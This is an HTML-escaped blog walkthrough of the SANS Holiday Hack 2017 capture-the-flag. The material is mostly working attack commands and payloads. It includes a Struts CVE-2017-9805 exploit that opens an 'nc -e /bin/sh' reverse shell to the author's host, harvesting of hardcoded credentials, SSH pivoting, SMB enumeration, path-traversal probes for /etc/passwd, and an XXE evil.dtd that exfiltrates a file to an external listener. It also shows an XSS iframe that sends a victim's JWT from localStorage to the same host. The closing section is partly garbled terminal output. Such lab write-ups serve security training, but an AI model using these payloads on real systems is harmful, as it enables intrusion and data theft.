&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Sugarplum Mary is &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a tizzy, we hope you can assist.
Christmas songs abound, with many likes &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;our midst.
The database is populated, ready &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;you to address.
Identify the song whose popularity is the best.
total 20684
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root 15982592 Nov 29 19:28 christmassongs.db
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root root  5197352 Dec  7 15:10 runtoanswer
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Inspecting the database file and its tables it will reveal it’s structure. You have to count the likes depending on a given songid:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elf@907587d5d549:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sqlite3 christmassongs.db 
SQLite version 3.11.0 2016-02-15 17:29:24
Enter &lt;span class=&quot;s2&quot;&gt;&quot;.help&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;usage hints.
sqlite&amp;gt; .schema
CREATE TABLE songs&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;INTEGER PRIMARY KEY AUTOINCREMENT,
  title TEXT,
  artist TEXT,
  year TEXT,
  notes TEXT
&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
CREATE TABLE likes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;INTEGER PRIMARY KEY AUTOINCREMENT,
  like INTEGER,
  datetime INTEGER,
  songid INTEGER,
  FOREIGN KEY&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;songid&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; REFERENCES songs&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can do this with the &lt;code class=&quot;highlighter-rouge&quot;&gt;HAVING&lt;/code&gt; syntax. It gives you the possibility to count all columns for a given value &lt;code class=&quot;highlighter-rouge&quot;&gt;like==1&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;songid&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlite&amp;gt; SELECT like,songid,COUNT(*) c FROM likes where like==1 GROUP BY songid HAVING c &amp;gt; 1700 limit 100;
1|90|1715
1|98|1706
1|134|1719
1|199|1702
1|245|1756
1|265|1720
1|392|8996
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Querying this songid from the second table gives us the songs name:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select title,id from songs where id=392;
Stairway to Heaven|392
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;apache-struts-server&quot;&gt;Apache Struts Server&lt;/h2&gt;
&lt;p&gt;Task: 2) Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball’s password?&lt;/p&gt;

&lt;p&gt;Sparkle Redberry gives a lot of hints about this tasks. It’s very important to get this because all the other servers are only accessible internally over this one.
We can summarize the hints from Sparkle:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Sometimes development content won’t be deleted in production state of websites&lt;/li&gt;
  &lt;li&gt;Alabaster, the admin, uses Apache Struts&lt;/li&gt;
  &lt;li&gt;Backdoors and webshells are good to access system remotely&lt;/li&gt;
  &lt;li&gt;Example for simple PHP webshell and &lt;a href=&quot;https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985&quot;&gt;Link&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Some silly developers leave hardcoded credentials behind&lt;/li&gt;
  &lt;li&gt;Isn’t vulnerable against CVE-2017-5638&lt;/li&gt;
  &lt;li&gt;Special character issues of XML and how to avoid them for exploiting with &lt;a href=&quot;https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code&quot;&gt;Link&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;SiteScreenshot&lt;/p&gt;

&lt;p&gt;Following the first hint I inspect the source code of the site:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt; 
    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Development version --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://dev.northpolechristmastown.com&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;display: none;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Access Development Version&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nmapping both servers reveals that it’s the same machine with multiple webservers serving different subdomains.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap l2s.northpolechristmastown.com

Starting Nmap 7.60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-01-12 22:05 CET
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;l2s.northpolechristmastown.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;35.185.84.51&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.093s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
rDNS record &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;35.185.84.51: 51.84.185.35.bc.googleusercontent.com
Not shown: 994 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  open   https
3389/tcp closed ms-wbt-server
5060/tcp closed sip
5061/tcp closed sip-tls

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;8.86 seconds

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap dev.northpolechristmastown.com

Starting Nmap 7.60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-01-12 22:06 CET
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;dev.northpolechristmastown.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;35.185.84.51&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.096s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
rDNS record &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;35.185.84.51: 51.84.185.35.bc.googleusercontent.com
Not shown: 994 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  open   https
3389/tcp closed ms-wbt-server
5060/tcp closed sip
5061/tcp closed sip-tls
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After some research following the hints I decided to use this &lt;a href=&quot;https://github.com/mazen160/struts-pwn_CVE-2017-9805&quot;&gt;tool&lt;/a&gt; after it’s indicating that this server is vulnerable:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python struts-pwn.py &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; https://dev.northpolechristmastown.com/orders/

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; URL: https://dev.northpolechristmastown.com/orders/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Status: Vulnerable!
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;%] Done.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;After some try and error uploading a webshell I ended up using a simple reverse shell with another but simliar tool.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python struts_xml.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; https://dev.northpolechristmastown.com/orders/- &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;nc -e /bin/sh federland.dnshome.de 56123&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As this is simple reverse shell is very annoying I was able to upgrade it nearly to a real TTY using this &lt;a href=&quot;https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/&quot;&gt;article&lt;/a&gt; and this resulting commands:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/sbin:/usr/bin:/sbin:/bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This two commands will give you easy access to all installed utilities and the possibility of using special keys.&lt;/p&gt;

&lt;p&gt;As mentioned in the hints, developers will leave credentials behind, you have to look out for developing files like source code or documentation. As Alabaster deploys a Apache Struts server it’s possible he created some java files for a apache tomcat server. Searching the default directory for the tomcat files we can find it:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rli&lt;/span&gt; password opt

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class
            ...
	    final String username &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;alabaster_snowball&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            final String password &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;stream_unhappy_buy_loss&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   
	    ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;network-reconnaisance&quot;&gt;Network Reconnaisance&lt;/h2&gt;

&lt;p&gt;Task: 3) The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap 10.142.0.0/24 
Starting Nmap 7.40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-12-17 14:38 UTC
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;hhc17-l2s-proxy.c.holidayhack2017.internal &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.142.0.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
2222/tcp open  EtherNetIP-1

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;hhc17-apache-struts1.c.holidayhack2017.internal &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.142.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;edb.northpolechristmastown.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.142.0.6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
389/tcp  open  ldap
8080/tcp open  http-proxy

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;hhc17-emi.c.holidayhack2017.internal &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.142.0.8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server


Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;hhc17-apache-struts2.c.holidayhack2017.internal &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.142.0.11&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;eaas.northpolechristmastown.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.142.0.13&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server


Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;mail.northpolechristmastown.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.142.0.5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
143/tcp  open  imap
2525/tcp open  ms-v-worlds
3000/tcp open  ppp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;nmap -PS445 10.142.0.0/24&lt;/p&gt;

&lt;p&gt;Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
Host is up (0.00073s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server&lt;/p&gt;

&lt;h2 id=&quot;windows-smb-server&quot;&gt;Windows SMB Server&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -L 139:10.142.0.7:139 -L 445:10.142.0.7:445 -L 135:10.142.0.7:135 -L 3389:10.142.0.7:3389  alabaster_snowball@l2s.northpolechristmastown.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap -u alabaster_snowball -p stream_unhappy_buy_loss -d workgroup -H 127.0.0.1 -R
[+] Finding open SMB ports....
[+] User SMB session establishd on 127.0.0.1...
[+] IP: 127.0.0.1:445	Name: localhost                                         
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	FileStor                                          	READ ONLY
	.\
	dr--r--r--                0 Wed Dec  6 22:51:45 2017	.
	dr--r--r--                0 Wed Dec  6 22:51:45 2017	..
	-r--r--r--           255520 Sun Dec 17 08:33:12 2017	BOLO - Munchkin Mole Report.docx
	-r--r--r--          1275756 Mon Dec  4 21:04:34 2017	GreatBookPage3.pdf
	-r--r--r--           111852 Sun Dec 17 08:31:32 2017	MEMO - Calculator Access for Wunorse.docx
	-r--r--r--           133295 Wed Dec  6 22:47:47 2017	MEMO - Password Policy Reminder.docx
	-r--r--r--            10245 Wed Dec  6 23:28:21 2017	Naughty and Nice List.csv
	-r--r--r--            60344 Wed Dec  6 22:51:47 2017	Naughty and Nice List.docx

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbget -U alabaster_snowball smb://127.0.0.1/FileStor/GreatBookPage3.pdfPassword for [alabaster_snowball] connecting to //FileStor/127.0.0.1: 
Using workgroup WORKGROUP, user alabaster_snowball
smb://127.0.0.1/FileStor/GreatBookPage3.pdf                                                    
Downloaded 1,22MB in 13 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;mail-server-with-custom-cookie-based-encryption&quot;&gt;Mail Server with custom Cookie based encryption&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -L 143:10.142.0.5:143  -L  8080:10.142.0.5:80 -L 25:10.142.0.5:25 -L 2222:10.142.0.5:22 -L 2525:10.142.0.5:2525 -L 3000:10.142.0.5:3000  alabaster_snowball@l2s.northpolechristmastown.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ dirb http://127.0.0.1:8080

---- Scanning URL: http://127.0.0.1:8080/ ----
+ http://127.0.0.1:8080/index.html (CODE:200|SIZE:11321)                                      
+ http://127.0.0.1:8080/info.php (CODE:200|SIZE:90820)   

./dotdotpwn.pl -m http -h 127.0.0.1 -x 8080 -M GET
[*] HTTP Status: 400 | Testing Path: http://127.0.0.1:8080/..%00%u2216..%00%u2216..%00%u2216..%00%u2216etc%u2216issue
[*] HTTP Status: 400 | Testing Path: http://127.0.0.1:8080/..%00%u2216..%00%u2216..%00%u2216..%00%u2216..%00%u2216etc%u2216passwd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sV 127.0.0.1 -p 22,25,8080,143,2525,3000

Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-20 18:54 CET
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000055s latency).

PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
25/tcp   open   smtp    Postfix smtpd
143/tcp  open   imap    Dovecot imapd
2525/tcp open   smtp    Postfix smtpd
3000/tcp open   http    Node.js Express framework
8080/tcp open   http    nginx 1.10.3 (Ubuntu)
Service Info: Host:  mail.northpolechristmastown.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;EWA=”{“name”:”GUEST”,”plaintext”:””,”ciphertext”:””}”&lt;/p&gt;

&lt;p&gt;EWA={“name”:”alabaster.snowball@northpolechristmastown.com”,”plaintext”:””,”ciphertext”:”WmczgfAW8upVlZabYxzEXQ”}&lt;/p&gt;

&lt;h2 id=&quot;online-resource-management-with-xml-external-entity-xxe-vulnerability&quot;&gt;Online Resource Management with XML External Entity (XXE) Vulnerability&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -L 8080:10.142.0.13:80 -L 3389:10.142.0.7:3389  alabaster_snowball@l2s.northpolechristmastown.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat order.xml
&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE demo [
    &amp;lt;!ELEMENT demo ANY &amp;gt;
    &amp;lt;!ENTITY % extentity SYSTEM &quot;http://federland.dnshome.de:13337/evil.dtd&quot;&amp;gt;
    %extentity;
    %inception;
    %sendit;
    ]
&amp;lt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat evil.dtd 
&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!ENTITY % stolendata SYSTEM &quot;file:///c:/greatbook.txt&quot;&amp;gt;
&amp;lt;!ENTITY % inception &quot;&amp;lt;!ENTITY &amp;amp;#x25; sendit SYSTEM 'http://federland.dnshome.de:13338/?%stolendata;'&amp;gt;&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -l 13338
GET /?http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf HTTP/1.1
Host: federland.dnshome.de:13338
Connection: Keep-Alive
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;database-with-xss-vulnerability-javascript-web-token-jwt-vulnerability-and-ldap-injection-vulnerability&quot;&gt;Database with XSS Vulnerability, JavaScript Web Token (JWT) Vulnerability and LDAP Injection Vulnerability&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -L 18080:10.142.0.6:80  -L 2222:10.142.0.6:22 -L 3890:10.142.0.6:389 -L 28080:10.142.0.6:8080  alabaster_snowball@l2s.northpolechristmastown.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch -h 127.0.0.1 -p 3890 -x -b &quot;dc=northpolechristmastown,dc=com&quot; &amp;gt; edb_ldap_dump.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat edb_ldap_dump.txt | grep &quot;mail:&quot; | cut -d&quot;:&quot; -f2 | cut -d&quot;@&quot; -f1 &amp;gt; usernames.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;xss&quot;&gt;XSS&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hi plz restore password &amp;lt;IFRAME SRC=# onload=&quot;document.getElementsByClassName('ticketlogo tooltipped')[0].setAttribute('src','http://federland.dnshome.de:56123/'+localStorage.getItem('np-auth'))&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;

nc -l -p 56123
GET /eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I HTTP/1.1
Referer: http://127.0.0.1/reset_request?ticket=W0M50-B1XAN-2L4ND-247NN
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,*
Host: federland.dnshome.de:56123

 echo eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I | base64 -d
{&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;jwt&quot;&gt;JWT&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pyjwt  ecode &lt;span class=&quot;nt&quot;&gt;--no-verify&lt;/span&gt; eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I
Essphrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;key &lt;span class=&quot;s1&quot;&gt;'/root/.ssh/id_rsa'&lt;/span&gt;: 
nter passphrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;key &lt;span class=&quot;s1&quot;&gt;'/root/.ssh/id_rsa'&lt;/span&gt;: 
